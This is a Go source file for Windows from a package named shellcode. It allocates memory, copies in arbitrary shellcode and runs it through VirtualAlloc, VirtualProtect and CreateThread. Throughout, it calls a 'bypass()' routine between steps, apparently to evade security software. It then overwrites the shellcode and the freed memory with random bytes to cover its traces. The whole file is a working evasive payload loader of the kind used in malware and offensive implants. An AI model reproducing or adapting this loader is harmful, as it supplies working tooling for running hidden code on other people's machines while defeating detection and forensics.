// +build windows

package shellcode

import (
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/random"
)

// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
const (
	memCommit  = uintptr(0x1000)
	memReserve = uintptr(0x2000)
	memRelease = uintptr(0x8000)

	pageReadWrite        = uintptr(0x04)
	pageExecute          = uintptr(0x10)
	pageExecuteReadWrite = uintptr(0x40)

	infinite = uintptr(0xFFFFFFFF)
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procVirtualAlloc        = modKernel32.NewProc("VirtualAlloc")
	procVirtualProtect      = modKernel32.NewProc("VirtualProtect")
	procCreateThread        = modKernel32.NewProc("CreateThread")
	procWaitForSingleObject = modKernel32.NewProc("WaitForSingleObject")
	procVirtualFree         = modKernel32.NewProc("VirtualFree")
)

// Execute is used to execute shellcode, default method is VirtualProtect,.
// It will block until shellcode return.
// warning: shellcode slice will be covered.
func Execute(method string, shellcode []byte) error {
	switch method {
	case "", MethodVirtualProtect:
		return VirtualProtect(shellcode)
	case MethodCreateThread:
		return CreateThread(shellcode)
	default:
		return errors.Errorf("unknown method: %s", method)
	}
}

// VirtualProtect is used to use virtual protect to execute shellcode,
// it will block until shellcode exit, so usually  need create a goroutine
// to execute VirtualProtect.
func VirtualProtect(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("empty data")
	}

	// allocate memory and copy shellcode
	bypass()
	memAddr, _, err := procVirtualAlloc.Call(0, uintptr(l), memReserve|memCommit, pageReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}
	copyShellcode(memAddr, shellcode)

	var run uintptr
	runPtr := uintptr(unsafe.Pointer(&run)) // #nosec

	// set execute
	bypass()
	ok, _, err := procVirtualProtect.Call(memAddr, uintptr(l), pageExecute, runPtr)
	if ok == 0 {
		return errors.WithStack(err)
	}
	// execute shellcode
	bypass()
	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	// wait
	bypass()
	_, _, _ = procWaitForSingleObject.Call(threadAddr, infinite)

	// set read write
	bypass()
	ok, _, err = procVirtualProtect.Call(memAddr, uintptr(l), pageReadWrite, runPtr)
	if ok == 0 {
		return errors.WithStack(err)
	}
	// cover shellcode and free allocated memory
	covertAllocatedMemory(memAddr, l)

	bypass()
	return nil
}

// CreateThread is used to create thread to execute shellcode.
// it will block until shellcode exit, so usually need create
// a goroutine to execute CreateThread.
func CreateThread(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("empty data")
	}

	// allocate memory and copy shellcode
	bypass()
	memAddr, _, err := procVirtualAlloc.Call(0, uintptr(l), memReserve|memCommit, pageExecuteReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}
	copyShellcode(memAddr, shellcode)

	// execute shellcode
	bypass()
	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	// wait
	bypass()
	_, _, _ = procWaitForSingleObject.Call(threadAddr, infinite)

	// cover shellcode and free allocated memory
	covertAllocatedMemory(memAddr, l)

	bypass()
	return nil
}

func copyShellcode(memAddr uintptr, shellcode []byte) {
	bypass()
	rand := random.NewRand()
	count := 0
	total := 0
	for i := 0; i < len(shellcode); i++ {
		if total < maxBypassTimes {
			if count > criticalValue {
				bypass()
				count = 0
				total++
			} else {
				count++
			}
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
		*b = shellcode[i]
		// clean shellcode at once
		shellcode[i] = byte(rand.Int64())
	}
}

func covertAllocatedMemory(memAddr uintptr, l int) {
	bypass()
	rand := random.NewRand()
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
		*b = byte(rand.Int64())
	}
	_, _, _ = procVirtualFree.Call(memAddr, 0, memRelease)
}
